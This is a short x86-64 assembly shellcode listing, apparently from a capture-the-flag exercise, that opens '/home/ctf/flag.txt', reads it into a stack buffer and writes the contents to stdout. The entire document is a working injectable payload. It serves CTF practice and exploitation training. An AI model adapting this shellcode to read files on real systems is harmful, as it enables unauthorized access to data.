BITS 64

_start:
    ; open("/home/ctf/flag.txt", O_RDONLY)
    xor eax, eax
    mov al, 2
    lea rdi, [rel path]
    xor esi, esi
    xor edx, edx
    syscall

    ; read(fd, buf, 4096)
    mov edi, eax
    xor eax, eax
    sub rsp, 4096
    mov rsi, rsp
    mov edx, 4096
    syscall

    ; write(1, buf, bytes_read)
    mov edx, eax
    mov eax, 1
    mov edi, 1
    mov rsi, rsp
    syscall

    ; exit(0)
    mov eax, 60
    xor edi, edi
    syscall

path: db "/home/ctf/flag.txt", 0
